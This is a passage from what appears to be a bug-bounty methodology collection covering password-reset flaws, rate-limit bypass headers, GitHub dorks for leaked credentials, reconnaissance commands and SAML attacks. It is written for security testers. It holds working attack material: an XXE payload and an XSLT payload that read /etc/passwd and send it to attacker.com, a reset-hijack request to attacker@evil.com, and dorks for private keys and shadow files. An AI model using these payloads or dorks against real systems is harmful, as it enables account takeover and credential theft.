      "Password_Reset_Flaws_by_Sm4rty.md": "Common security flaws in password reset functionality compiled from twitter, writeups, disclosed reports:\r\n\r\n\r\n\r\n\r\n1. Password Reset Token Leak Via Referrer\r\n\r\nThe HTTP referer is an optional HTTP header field that identifies the address of the webpage which is linked to the resource being requested.\r\nThe Referer request header contains the address of the previous web page from which a link to the currently requested page was followed \r\n\r\nExploitation\r\n    Request password reset to your email address\r\n    Click on the password reset link\r\n    Dont change password\r\n    Click any 3rd party websites(eg: Facebook, twitter)\r\n    Intercept the request in burpsuite proxy\r\n    Check if the referer header is leaking password reset token.\r\n    \r\n    \r\n    \r\n    \r\n2. Sending an array of email addresses instead of a single email address.\r\n\r\nIn this attack the The attacker can send a password reset link to an arbitrary email by sending an array of email addresses instead of a single email address and It could lead to full account takeover.\r\n\r\nPOST https://example.com/api/v1/password_reset HTTP/1.1\r\nOriginal Request Body:\r\n{“email_address”:”xyz@gmail.com”}\r\nModified Request Body:\r\n{“email_address”:[“admin@breadcrumb.com”,”attacker@evil.com”]}\r\n\r\nIn this way, the password reset link get send to both victim as well as attacker. And the attacker can use it to gain Full account Takeover.\r\n\r\n\r\n\r\n\r\n3. Bruteforcing OTP for Reseting Password.\r\n\r\n  Now, In case The password reset functionality of application is based on OTP validation.\r\n  Many program accepts No rate limit as acceptable risk. So, Bruteforcing OTP is worth trying.\r\n  You can reset the password of an account by intercepting the request for OTP validation and bruteforcing the 6 digit number.\r\n  Using this, it is possible to change and reset the password of any account, by changing the user data and brute-forcing the reset OTP.\r\n  \r\n    Exploitation\r\n      1. Start the Burp Suite and Intercept the password reset request\r\n      2.Send to intruder\r\n      3.Use null payload\r\n  \r\n  \r\n  \r\n  \r\n4. Full Account Takeover via Changing Email And Password of any User through API Parameters\r\nExploitation\r\n\r\n    1. Attacker have to login with their account and Go to the Change password function\r\n    2. Start the Burp Suite and Intercept the request\r\n    3. After intercepting the request sent it to repeater and modify parameters Email and Password\r\n      POST /api/changepass\r\n      [...]\r\n      (\"form\": {\"email\":\"victim@email.tld\",\"password\":\"12345678\"})\r\n      \r\n      \r\n      \r\n5. Response manipulation: Replace Bad Response With Good One\r\n\r\nLook for Request and Response like these\r\nHTTP/1.1 401 Unauthorized\r\n(“message”:”unsuccessful”,”statusCode:403,”errorDescription”:”Unsuccessful”)\r\n\r\nChange Response\r\nHTTP/1.1 200 OK\r\n(“message”:”success”,”statusCode:200,”errorDescription”:”Success”)\r\n\r\n\r\n      \r\n      \r\n"
    },
    {
      "Password_Reset_Token_Leakage.md": "Password Reset Token Leakage\r\n    \r\n    Steps:\r\n    1.Sent a password reset request using forget password\r\n\t2.Check your email \r\n\t3.copy your reset page link and paste in another tab and make burp intercept on.\r\n\t4.Look for every request if you find similiar token that is in reset link with other domain like: bat.bing.com or facebook.com\r\n\t5.Than there is reset password token leakage.\r\n\r\n### Authors\r\n\r\n* [@Virdoex_hunter](https://twitter.com/Virdoex_hunter)\r\n"
    },
    {
      "README.md": "# Password Reset Mindmap\r\n[object Promise]\r\n\r\n# Source\r\n* [Twitter](https://twitter.com/N008x/status/1302515523557548032/photo/1)\r\n* [Blog](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)\r\n# Authors\r\n* [KathanP19](https://twitter.com/KathanP19)\r\n"
    }
  ],
  "Rate_limit": [
    {
      "RateLimitBypass.md": "# Rate Limit Bypass Techniques \r\n## There are two ways to do that \r\n- Customizing HTTP Methods\r\n- Adding Headers to Spoof IP\r\n\r\n## 1. Customizing HTTP Methods\r\n- If the request goes on GET try to change it to POST, PUT, etc.,\r\n- If you wanna bypass the rate-limit in API's try HEAD method.\r\n\r\n## Rate Limit Bypass using Header \r\n\r\nUse the following Header just Below the Host Header \r\n\r\n```\r\nX-Forwarded-For: IP\r\nX-Forwarded-IP: IP\r\nX-Client-IP: IP\r\nX-Remote-IP: IP\r\nX-Originating-IP: IP\r\nX-Host: IP\r\nX-Client: IP\r\n\r\n#or use double X-Forwarded-For header\r\nX-Forwarded-For:\r\nX-Forwarded-For: IP\r\n```\r\n## Adding HTTP Headers to Spoof IP and Evade Detection\r\n- These are Headers I've collected so far to Bypass Rate-Limits.\r\n```\r\nX-Forwarded: 127.0.0.1\r\nX-Forwarded-By: 127.0.0.1\r\nX-Forwarded-For: 127.0.0.1\r\nX-Forwarded-For-Original: 127.0.0.1\r\nX-Forwarder-For: 127.0.0.1\r\nX-Forward-For: 127.0.0.1\r\nForwarded-For: 127.0.0.1\r\nForwarded-For-Ip: 127.0.0.1\r\nX-Custom-IP-Authorization: 127.0.0.1\r\nX-Originating-IP: 127.0.0.1\r\nX-Remote-IP: 127.0.0.1\r\nX-Remote-Addr: 127.0.0.1\r\n```\r\n\r\n## Rate Limit Bypass using Special Characters \r\n\r\n- Adding Null Byte ( %00 ) at the end of the Email can sometimes Bypass Rate Limit.\r\n- Try adding a Space Character after a Email. ( Not Encoded )\r\n- Some Common Characters that help bypassing Rate Limit : %0d , %2e , %09 , %20 , %0, %00, %0d%0a, %0a, %0C\r\n- Adding a slash(/) at the end of api endpoint can also Bypass Rate Limit. `domain.com/v1/login` -> `domain.com/v1/login/`\r\n\r\n\r\n## Using IP Rotate Burp Extension\r\n\r\n- Try changing the user-agent, the cookies... anything that could be able to identify you\r\n- If they are limiting to 10 tries per IP, every 10 tries change the IP inside the header.\r\n  Change other headers\r\n- Burp Suite's Extension IP Rotate works well in many cases. Make sure you have Jython installed along.\r\n\r\n- Here You'll everything you need - https://github.com/PortSwigger/ip-rotate\r\n\r\n\r\n## You can find some more here - [Check this out](https://medium.com/bugbountywriteup/bypassing-rate-limit-like-a-pro-5f3e40250d3c)\r\n## You can find more with screenshot https://medium.com/@huzaifa_tahir/methods-to-bypass-rate-limit-5185e6c67ecd\r\n\r\n# Reference\r\n* https://twitter.com/m4ll0k2/status/1294983599943540738/photo/1\r\n* https://twitter.com/SalahHasoneh1/status/1287366496432332800\r\n* https://twitter.com/SMHTahsin33/status/1295054667613757441 (all in one must check)\r\n\r\n# Authors:  \r\n* [Keshav Malik](https://www.linkedin.com/in/keshav-malik-22478014a) </br>\r\n* [0xd3vil](https://linkedin.com/in/0xd3vil) </br>\r\n* [Virdoex_hunter](https://twitter.com/Virdoex_hunter)\r\n* [@0xCyberPirate](https://twitter.com/0xCyberPirate)\r\n"
    }
  ],
  "Recon": [
    {
      "Github_Dorking.md": "# GitHub Recon:\r\n\r\n## Specific Org search:\r\n- \"Org_name\" password\r\n- \"org_name\" key\r\n- \"org_name\" api\r\n- \"org_name\" “filename:vim_settings.xml”\r\n- \"org_name\" \"Authorization: Bearer\"\r\n- \"org_name\" \"Language: PHP\"\r\n\r\n## Sensitive Files search:\r\n\r\n- filename:manifest.xml\r\n- filename:travis.yml\r\n- filename:vim_settings.xml\r\n- filename:database\r\n- filename:secrets.yml password\r\n- filename:.esmtprc password\r\n- filename:passwd path:etc\r\n- filename:dbeaver-data-sources.xml\r\n- path:sites databases password\r\n- filename:config.php dbpasswd\r\n\r\n## Specific Language based search:\r\n\r\n- language:python username\r\n- language:php username\r\n- language:sql username\r\n- language:html password\r\n- language:perl password\r\n- language:shell username\r\n- language:java api\r\n- HOMEBREW_GITHUB_API_TOKEN language:shell\r\n\r\n## API keys, Token & Hard-Coded Password search:\r\n \r\n- SecretKey / Secrect_key / skey\r\n- privatekey / private_key / pkey\r\n- user_secret / userSecret\r\n- admin_passwd / adminpasswd / adminPass etc\r\n- “api keys”\r\n- authorization_bearer:\r\n- oauth\r\n- auth\r\n- authentication\r\n- client_secret\r\n- api_token:\r\n- “api token”\r\n- client_id\r\n- password\r\n- user_password\r\n- user_pass\r\n- passcode\r\n- client_secret\r\n- secret\r\n- password hash\r\n- OTP\r\n- user auth\r\n\r\n## Username search:\r\n\r\n- user:name (user:admin)\r\n- org:name (org:google type:users)\r\n- in:login (<username> in:login)\r\n- in:name (<username> in:name)\r\n- fullname:firstname lastname (fullname:<name> <surname>)\r\n- in:email (data in:email)\r\n\r\n## GitHub Dorks for Finding Information using Dates:\r\n\r\n- created:<2012–04–05\r\n- created:>=2011–06–12\r\n- created:2016–02–07 location:iceland\r\n- created:2011–04–06..2013–01–14 <user> in:username\r\n\r\n## Extension based search:\r\n\r\n- extension:pem private\r\n- extension:ppk private\r\n- extension:sql mysql dump\r\n- extension:sql mysql dump password\r\n- extension:json api.forecast.io\r\n\r\n## Automated Tools:\r\n\r\n1. [TruffleHog](https://github.com/dxa4481/truffleHog)\r\n2. [WatchTower](https://radar.nightfall.ai/)\r\n\r\n## NOTE :\r\nIf you find any API key or credentials or any other sensitive information under test directory then do not report it because that is an intended behaviour.\r\n\r\n## Author:\r\n[Mr._fr3qu3n533](https://twitter.com/mr_fr3qu3n533)\r\n"
    },
    {
      "subdomain_enumeration.md": "# Subdomain Enumeration \r\nWell, subdomain enumeration is important when you are hunting on wildcard enable scope programs. \r\nIf you are able to get unique subdomains that other miss then it's a good chance for you to get some bugs\r\n\r\n# General Methodology\r\n* Passive\r\n* Active\r\n* Permutation\r\n\r\n## Passive\r\nIn this stage you have to use as much resources as you can to passivly gather subdomains\r\nNow a days it's not that much hard to do with community standard tools that usages API keys\r\n\r\n### Tools\r\n\r\n* Subfinder\r\n* Amass\r\n* Assetfinder\r\n* Findomain\r\n\r\n## Active\r\nIn this stage you have to perform bruteforcing on your target host to see if the word from your wordlist resolve as valid subdomain or not\r\n\r\n### Tools\r\n\r\n* ShuffleDNS\r\n* Aiodnsbrute\r\n\r\n## Permutation\r\nIn this stage you have to play around the subdomains. Now do changed with the words and see still it resolve as valid or not\r\n\r\n## Portscan\r\nConvert domains into ip address\r\n```bash\r\nwhile read l; do ip=$(dig +short $l|grep -oE \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\"|head -1);echo \"[+] '$l' => $ip\";echo $ip >> ips.txt;done < domains.txt\r\n\r\n```\r\n\r\nwe will use masscan for faster results\r\n\r\n>masscan -p1-65535 -iL ips.txt --max-rate 1800 -oG output.log\r\n\r\nor you can use [Naabu](https://github.com/projectdiscovery/naabu), [RustScan](https://github.com/RustScan/RustScan/).\r\n\r\n### Tools\r\n\r\n* AltDNS\r\n* DNSGen + ShuffleDNS\r\n\r\n## Reference & Resources\r\n\r\nhttps://pentester.land/cheatsheets/2018/11/14/subdomains-enumeration-cheatsheet.html\r\n\r\nhttps://0xpatrik.com/subdomain-enumeration-2019/\r\n\r\nhttps://0xpatrik.com/subdomain-enumeration-smarter/\r\n\r\nhttps://rootsploit.com/bug-bounty-recon-faster-port-scan/\r\n\r\nTheres a lot you can do. For now just mentioning communty standard approaches. Will be updating it regularly depending on the methodology comes out. \r\n\r\n## Framework\r\nAn automated framework can be used to automate those whole workflow\r\n\r\n* [SEF](https://github.com/remonsec/SEF)\r\n___\r\n## Author\r\n[Mehedi Hasan Remon](https://twitter.com/remonsec)\r\n[Rishi Choudhary](https://twitter.com/0xRyuk)"
    },
    {
      "Workflow.md": "## Recon workflow\r\n\r\n1. IP space discovery\r\n2. TLDs, Acquisitions, & Relations\r\n3. Subdomain Enum\r\n4. Fingerpirnting\r\n5. Dorking\r\n6. Content Discovery\r\n7. Parameter Discovery\r\n\r\n## ASN Discovery\r\n\r\n**ASN Discovery of Target:** \r\n\r\n[https://bgp.he.net](https://bgp.he.net/) \r\n\r\n**ASN using whois:** \r\n\r\n`whois -h whois.cymru.com $(dig +short example.com)` \r\n\r\nNOTE: Be careful cause sometimes you might get ASN for VPSs like digital ocean etc. Don't work on them.\r\n\r\n**Using Nmap & ASN for discoverying IP related to the targetted ASN**\r\n\r\n`nmap --script targets-asn --script-args targets-asn.asn=<ASN Number>`\r\n\r\n**Gathering Company intel using AMASS**\r\n\r\n`amass intel -org <Organisation name(not domain)>`\r\n\r\n**ARIN for ASN:**\r\n\r\n[`https://whois.arin.net`](https://whois.arin.net/) \r\n\r\n**Site: IPINFO for ASN**\r\n\r\n[`https://ipinfo.io`](https://ipinfo.io/)\r\n\r\n**Subdomains using ASNs using AMASS:**\r\n\r\n`amass intel -asn <ASN_number>`\r\n\r\n## Discovering Brands\r\n\r\n-***Looking for acquisition or related orgs to target***\r\n\r\n- wikipedia\r\n- Crunchbase\r\n\r\n[Crunchbase: Discover innovative companies and the people behind them](https://www.crunchbase.com)\r\n\r\n- Owler\r\n\r\n[](http://owler.com/)\r\n\r\n- Accquiredby\r\n\r\n[AcquiredBy | Definitive list of bootstrapped acquisitions](https://acquiredby.co/)\r\n\r\n- LinkedIn\r\n- ReverseWhois using amass intel module\r\n\r\n    `amass intel -d [domain.com](http://domain.com) -whois`\r\n\r\n- BuiltWith\r\n\r\n[BuiltWith](https://builtwith.com/)\r\n\r\n- Google dork:\r\n\r\n`intext:\"copyright ©️ org_name\"`\r\n\r\n- Shodan Dork using HTTP favicon hashes\r\n\r\n`http.favicon.hash:<hash>`\r\n\r\n**Favicon hash can be found using [favfreak](https://github.com/devanshbatham/FavFreak)**\r\n\r\n### Author\r\n[Mr._fr3qu3n533](https://twitter.com/mr_fr3qu3n533)\r\n"
    }
  ],
  "SAML": [
    {
      "SAML.md": "# SAML\r\n- **Single Sign-on (SSO) is an authentication service that allows users to utilize a single set of credentials to access multiple applications. Security Assertion Markup Language (SAML) is one of the ways one can implement SSO.**\r\n- **Security Assertion Markup Language (SAML) is a markup language implemented in XML.**\r\n- **SAML messages are base64 encoded but that is easily decoded to view the message contents.**\r\n- **SAML and OAuth are different protocols and are used for different purposes, OAuth is a protocol for authorization while SAML is a protocol for authentication.**\r\n\r\n# How it Works:\r\n\r\n- SAML enables SSO by managing the interaction between three parties: The user(**SAML Assertion**), the identity provider, and the service provider\r\n\r\n```python\r\n1. SAML Assertion:An XML message that contains information about the user’s identity and potentially other user attributes.\r\n2. Identity Provider (IdP): The service performing the authentication and issuing the Assertion. Authentication can be any number of things from username/password to 2FA.\r\n3. Service Provider (SP): The web application that the user wants to access.\r\n```\r\n\r\n[object Promise]\r\n\r\n\r\n# Attacks:\r\n\r\n1. **XML SIGNATURE WRAPPING (XSW):** \r\n- The basic premise behind XSW is that XML documents containing XML Signatures may be processed in two separate steps: once for the validation of the digital signature, and once for the real application that uses the XML data. Consider the following two steps and the methods used to arrive at a single XML element:\r\n- XML Signature Validation\r\n    - The application locates the **`<ds:Signature>`**’s **`<ds:Reference>`** element\r\n    - The application uses the **`<ds:Reference>`**’s **`URI`** attribute to determine which XML element is signed\r\n    - The application (in)validates the signed XML element\r\n- After validation, the same application attempts to use the signed data as part of its normal operation.\r\n    - The application’s XML parser locates its desired XML element using top-down tree-based navigation\r\n\r\n```python\r\n- Signature wrapping attacks bypass signature validation of Sam'l assertions. This is done because the service provider does not check for multiple assertions. By sending more than one assertion within a SAML message, we're able to confuse the service provider. We are able to have our valid assertion pass through with an Invalid assertion that then assumes the identity of another user when engaged with a penetration test involving SAML. Make sure you ask your client contact for an extra username which is valid on the system for testing purposes. You won't need the credentials for this user, but you do need another user name that is valid.\r\n- When multiple assertion bodies are provided to the service provider with a signature wrapping attack, after the identity provider authenticated our user, we are able to confuse the service provider and then we are able to gain access to the additional users account that we provided in this case Admin.\r\n\r\n- There are total 8 types XSW attacks. (All of them can be easily done using SAMLRaider)\r\n\r\n# Steps to Perform XSW Attacks:\r\n1. Login to SSO\r\n2. Intercept the request were you can see SAML Assertions in SAML Raider\r\n3. Try every XSW attacks that SAML Raider offers by clicking \"Apply XSW\" button.\r\n4. Once you see XSW attack applied in SAML Raider change the top assertion value to you desire account\r\n5. Now Forward it through.\r\n6. Done, Check if you are logged in as the victim.\r\n\r\nReference: https://www.youtube.com/watch?v=ALakvKDsZLo  \r\n```\r\n\r\n```python\r\n**Key Note:** XSW #2, XSW #1, manipulates SAML responses. The only two that deal with Responses are XSW #1 and XSW #2.\r\n\r\nXSW Attack #1\r\n- XSW #1 tampers with SAML responses. It accomplishes this by producing a copy of the SAML Response and Assertion, then inserting the original Signature as a child element of the copied Response into the XML. The assumption is that following signature validation, the XML parser identifies and utilises the copied Response at the top of the document rather than the original signed Response.\r\nXSW Attack #2\r\n- The primary distinction between #1 and #2 is that XSW #2 uses a detachable signature, whereas XSW #1 uses an enveloping signature. The malicious Response's position remains unchanged.\r\n\r\n**Key Note:** XSW #4 is similar to #3 they play with Assertion element.\r\n\r\nXSW Attacks #3\r\n- The first example of an XSW that wraps the Assertion element is XSW #3. The cloned Assertion is inserted as the first child of the root Response element by SAML Raider. The replicated Assertion is a sibling of the original Assertion.\r\nXSW Attakcs #4\r\n- XSW #4 is similar to #3, except that the original Assertion becomes a child of the duplicated Assertion in this case.\r\n\r\n**Key Note:** XSW #5 and #6 are similar and deals with Assertion Wrapping\r\n\r\nXSW Attack #5\r\n- XSW #5 is the first example of Assertion wrapping in which the Signature and the original Assertion are not in one of the three typical configurations (enveloped/enveloping/detached). The duplicated Assertion encircles the Signature in this example.\r\nXSW Attack #6\r\n- XSW #6 places its duplicated Assertion in the same spot as #s 4 and 5. The copy of the Assertion envelopes the Signature, which in turn envelopes the original Assertion.\r\n\r\n**Key Note:** \r\n- Extensions is a valid XML element with a broader schema specification. This technique was created in response to the OpenSAML library by the authors of this white paper. To accurately compare the ID used during signature validation to the ID of the processed Assertion, OpenSAML employed schema validation. The authors discovered that if copied Assertions with the same ID as the original Assertion were children of an element with a less restrictive schema definition, they might avoid this countermeasure.\r\n- XSW attack #7 and #8\r\n\r\nXSW Attack #7\r\n- XSW #7 inserts an Extensions element and adds the copied Assertion as a child.\r\nXSW Attack #8\r\n- XSW #8 use a less restrictive XML element to execute a variant of the attack pattern employed in XSW #7. Instead of the copied Assertion, the original Assertion is the child of the less restrictive element this time.\r\n```\r\n\r\n2. **XML SIGNATURE EXCLUSION:**\r\n- Signature Exclusion is used to test how the SAML implementation behaves when there is no Signature element.\r\n- When a Signature element is absent the signature validation step may get skipped entirely.\r\n\r\n```python\r\n# Steps to Perform:\r\n1. Intercept SAML response.\r\n2. Open SAMLRaider and click \"Remove Signatures\" button\r\n3. Forward the request.\r\n4. If not error from SP (Service Provider) then try tampering attribute like UserID.\r\n5. Done!, check if you are in Vitim Account.\r\n\r\n# Other Signature Attacks:\r\n- Predictable signature\r\n- Use of encryption with a weak signature\r\n\r\n```\r\n\r\n3. **CERTIFICATE FAKING:**\r\n- Certificate faking is the process of testing whether or not the Service Provider verifies that a trusted Identity Provider signed the SAML Message.\r\n\r\n```python\r\n# Steps to Perform:\r\n1. Intercept SAML response in SAMLRaider.\r\n2. If there is a Signature included in the Response, use the \"Send Certificate to SAML Raider Certs\" button.\r\n3. After sending the certificate, we should see an imported certificate in the SAML Raider Certificates tab.\r\n4. We highlight the imported cert and press the \"Save and Self-Sign\" button.\r\n5. Back to Burp Proxy SAML Raider\r\n6. First, select the new self-signed cert from the XML Signature dropdown menu.\r\n7. Then use the \"Remove Signatures\" button to remove any existing signatures.\r\n8. Finally, use the \"(Re-)Sign Message\" or \"(Re-)Sign Assertion button\"\r\n9. After signing the message with the self-signed cert, send it on its way.\r\n\r\n- If we authenticate, we know that we can sign our SAML Messages. \r\n- The ability to sign our SAML Messages means we can change values in the Assertion and they will be accepted by the Service Provider.\r\n```\r\n\r\n4. **TOKEN RECIPIENT CONFUSION:**\r\n- Token Recipient Confusion tests whether or not the Service Provider validates the Recipient.\r\n- The Recipient field is an attribute of the SubjectConfirmationData element, which is a child of the Subject element in a SAML Response.\r\n- The Recipient attribute found on the SubjectConfirmationData element is a URL that specifies the location to which the Assertion must be delivered. If the Recipient is a different Service Provider than the one who receives it, the Assertion should not be accepted.\r\n\r\n```python\r\n# Pre-requisite:\r\n- Have a Legit account on a SP to use the token we get from SP on Target-SP and both SP's should use Same IdP.\r\n\r\n# Steps to Peform:\r\n1. Get Token From Legit-SP\r\n2. Try Same on Target-SP\r\n3. If successful you will be able to access Target-SP resource.\r\n\r\n#Exploitation Example:\r\nExploit 1: Suppose that SP SA  (Developer Department) and Starget (Sales Department) are accepting tokens from the same IdP, and the attacker does not have access to Starget .\r\nThe attacker (e.g. a worker in the developer team) does, however, have a legitimate account on SA, thus he can request a token from the IdP for this service. By sending tA to Starget (instead of SA ), the attack is performed. It is considered successful if tA is accepted by Starget; the attacker is thus logged in with the same account name as he has for SA and gets access to Starget's corresponding resources.\r\n\r\nExploit 2: Alternatively, the attacker can set up his own SP (Sbad ) offering some service for registered users (e.g., a weather forecast). To authenticate to Sbad, SSO is used and the attacker specifically federates it with the same IdP used by Starget . After that, the attacker lures the victim (a legitimate user of Starget ) to register with and authenticate to Sbad. Instead of or in addition to its usual service (weather forecast), Sbad stores all tokens in a database so that the attacker can access them. The attacker can then try to use the tokens to log in on Starget as the victim. The attack is considered successful, if an authentication token tbad issued for the victim for service Sbad is successfully verified on Starget .\r\n```\r\n\r\n5. **MISCELLANEOUS ATTACKS:**\r\n\r\n```python\r\n#. Simply Change Assertion Value to Victim:\r\n1. Intercept SAML Response in SAML Raider\r\n2. Change the User parameter or id to other user.\r\n\t\tExample: user@email.com to admin@email.com\r\n3. Done, Forward the Request.\r\n\r\n# SAML: Comment Injection I\r\n1. Find Registeration page for SP\r\n2. Use comment in payload like \"admin<!--comment-->@email.com\" while registering\r\n3. SP think it as admin@email.com \r\n4. Done, you are admin now ;)\r\n\r\n# SAML: Comment Injection II\r\n1. Find Registeration page for SP\r\n2. Register as any user like \"admin<!--comment-->@gmail.com\" ==> Invalid signature\r\n3. Try different \"admin@gmail.com<!--comment-->.test\" ==> valid signature\r\n4. SP think it as admin@email.com \r\n5. Done, you are admin now ;)\r\n```\r\n\r\n6. **XXE  in SAML:**\r\n\r\n```python\r\n**NOTE:** You can try all XXE attack techniques here its not limited to this only.\r\n\r\n# SIMPLE XXE ATTACK:\r\n1. Intercept the SAML Response in SAML Raider\r\n2. Add XXE payload in the beginning like below:\r\n\t\t<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n\t\t <!DOCTYPE foo [  \r\n\t   <!ELEMENT foo ANY >\r\n\t   <!ENTITY    file SYSTEM \"file:///etc/passwd\">\r\n\t   <!ENTITY dtd SYSTEM \"http://www.attacker.com/text.dtd\" >]>\r\n3. Send the Request and check the response.\r\n4. Done, escalate further!.\r\n```\r\n\r\n7. **XSLT in SAML:**\r\n\r\n```python\r\n**NOTE:**\r\n- The attack doesn’t require a valid signature to succeed.\r\n- The XSLT transformation occurs before the digital signature is processed for verification.\r\n\r\n# Steps to Perform:\r\n1**. Intercept the SAML Response in SAML Raider.\r\n2. Add XSLT payload in side transforms assertion like below.\r\n\t\t<ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\r\n\t  ...\r\n\t    <ds:Transforms>\r\n\t      <ds:Transform>\r\n\t        <xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\r\n\t          <xsl:template match=\"doc\">\r\n\t            <xsl:variable name=\"file\" select=\"unparsed-text('/etc/passwd')\"/>\r\n\t            <xsl:variable name=\"escaped\" select=\"encode-for-uri($file)\"/>\r\n\t            <xsl:variable name=\"attackerUrl\" select=\"'http://attacker.com/'\"/>\r\n\t            <xsl:variable name=\"exploitUrl\" select=\"concat($attackerUrl,$escaped)\"/>\r\n\t            <xsl:value-of select=\"unparsed-text($exploitUrl)\"/>\r\n\t          </xsl:template>\r\n\t        </xsl:stylesheet>\r\n\t      </ds:Transform>\r\n\t    </ds:Transforms>\r\n\t  ...\r\n\t\t</ds:Signature>\r\n3. Forward the request and check response.\r\n4. Done Escalate Further.!! \r\n```\r\n\r\n# Tools:\r\n\r\n[SAML Encoder - Online SAML Request-Response Encode Tool - Base64 - Deflate](https://www.samltool.com/encode.php)\r\n\r\n[https://github.com/CompassSecurity/SAMLRaider](https://github.com/CompassSecurity/SAMLRaider)\r\n\r\n[GitHub - fadyosman/SAMLExtractor: A tool that can take a URL or list of URL and prints back SAML consume URL.](https://github.com/fadyosman/SAMLExtractor)\r\n\r\n# Labs:\r\n\r\n[GitHub - yogisec/VulnerableSAMLApp: Vulnerable SAML infrastructure training applicaiton](https://github.com/yogisec/VulnerableSAMLApp)\r\n\r\n# Reference:\r\n\r\n[How to Hunt Bugs in SAML; a Methodology - Part I -](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)\r\n\r\n[How to Hunt Bugs in SAML; a Methodology - Part II -](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\r\n\r\n[How to Hunt Bugs in SAML; a Methodology - Part III -](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)\r\n\r\n[https://sso-attacks.org/Main_Page](https://sso-attacks.org/Main_Page)\r\n\r\n[https://research.aurainfosec.io/bypassing-saml20-SSO/](https://research.aurainfosec.io/bypassing-saml20-SSO/)\r\n\r\n[SAML From A Hackers Perspective - Part 1 Intro](https://www.youtube.com/watch?v=KEwki41ZWmg&list=PLCwnLq3tOElrEU-KoOdeiixiNCWkeQ99F&index=1)\r\n\r\n[Verification of SAML Tokens - Traps and Pitfalls](https://web-in-security.blogspot.com/2014/10/verification-of-saml-tokens-traps-and.html)\r\n\r\n## Mind-Maps:\r\n\r\n- [Mind Map by Harsh Bothra Checklist for SAML.pdf](https://drive.google.com/file/d/1iLgbd9IbcYgu4n1yJAVUyYbWnzYXmbyp/view?usp=drivesdk)\r\n\r\n[object Promise]\r\n\r\n# Tips:\r\n\r\n```python\r\nGoogle Dork to Find SAML logins:\r\ninurl:\"/saml2?SAMLRequest=\"\r\ninurl:\"/simplesaml/module.php/core/loginuserpass.php?AuthState=\"\r\ninurl:\"simplesaml/saml2/idp\"\r\n\r\nBurp search [SAMLResponse]\r\n 1.PHNhbWx -> b64decode -> '<saml'\r\n 2.PD94bWw -> b64decode -> '<?xml'\r\n```\r\n\r\n### Author:\r\n- [Kathan Patel](https://twitter.com/KathanP19)\r\n"
    }
  ],
  "Sensitive_Info_Leaks": [
    {
      "Github-dorks.md": "**GitHub Dork List :**\r\n\r\n**GitHub Dorks for Finding Files**\r\n\r\n- filename:manifest.xml\r\n- filename:travis.yml\r\n- filename:vim_settings.xml\r\n- filename:database\r\n- filename:prod.exs NOT prod.secret.exs\r\n- filename:prod.secret.exs\r\n- filename:.npmrc _auth\r\n- filename:.dockercfg auth\r\n- filename:WebServers.xml\r\n- filename:.bash_history <Domain name>\r\n- filename:sftp-config.json \r\n- filename:sftp.json path:.vscode\r\n- filename:secrets.yml password\r\n- filename:.esmtprc password\r\n- filename:passwd path:etc\r\n- filename:dbeaver-data-sources.xml\r\n- path:sites databases password\r\n- filename:config.php dbpasswd\r\n- filename:prod.secret.exs\r\n- filename:configuration.php JConfig password\r\n- filename:.sh_history\r\n- shodan_api_key language:python\r\n- filename:shadow path:etc\r\n- JEKYLL_GITHUB_TOKEN\r\n- filename:proftpdpasswd\r\n- filename:.pgpass\r\n- filename:idea14.key\r\n- filename:hub oauth_token\r\n- HEROKU_API_KEY language:json\r\n- HEROKU_API_KEY language:shell\r\n- SF_USERNAME salesforce\r\n- filename:.bash_profile aws\r\n- extension:json [api.forecast.io](http://api.forecast.io/)\r\n- filename:.env MAIL_HOST=[smtp.gmail.com](http://smtp.gmail.com/)\r\n- filename:wp-config.php\r\n- extension:sql mysql dump\r\n- filename:credentials aws_access_key_id\r\n- filename:id_rsa or filename:id_dsa\r\n\r\n----------\r\n\r\n\r\n**GitHub Dorks for Finding Languages**\r\n\r\n - language:python username\r\n - language:php username\r\n - language:sql username\r\n - language:html password\r\n - language:perl password\r\n - language:shell username\r\n - language:java api\r\n - HOMEBREW_GITHUB_API_TOKEN language:shell\r\n\r\n------\r\n\r\n\r\n**GiHub Dorks for Finding API Keys, Tokens and Passwords**\r\n\r\n- api_key\r\n- “api keys”\r\n- authorization_bearer:\r\n- oauth\r\n- auth\r\n- authentication\r\n- client_secret\r\n- api_token:\r\n- “api token”\r\n- client_id\r\n- password\r\n- user_password\r\n- user_pass\r\n- passcode\r\n- client_secret\r\n- secret\r\n- password hash\r\n- OTP\r\n- user auth\r\n\r\n\r\n-----\r\n\r\n**GitHub Dorks for Finding Username**s\r\n\r\n- user:name (user:admin)\r\n- org:name (org:google type:users)\r\n- in:login (<username> in:login)\r\n- in:name (<username> in:name)\r\n- fullname:firstname lastname (fullname:<name> <surname>)\r\n- in:email (data in:email)\r\n- GitHub Dorks for Finding Information using Dates\r\n- created:<2012–04–05\r\n- created:>=2011–06–12\r\n- created:2016–02–07 location:iceland\r\n- created:2011–04–06..2013–01–14 <user> in:username\r\n\r\n-----\r\n\r\n**GitHub Dorks for Finding Information using Extension**\r\n\r\n- extension:pem private\r\n- extension:ppk private\r\n- extension:sql mysql dump\r\n- extension:sql mysql dump password\r\n- extension:json [api.forecast.io] (http://api.forecast.io/)\r\n- extension:json [mongolab.com] (http://mongolab.com/)\r\n- extension:yaml [mongolab.com] (http://mongolab.com/)\r\n- [WFClient] Password= extension:ica\r\n- extension:avastlic “[support.avast.com] (http://support.avast.com/)”\r\n- extension:json googleusercontent client_secret\r\n"
    },
    {
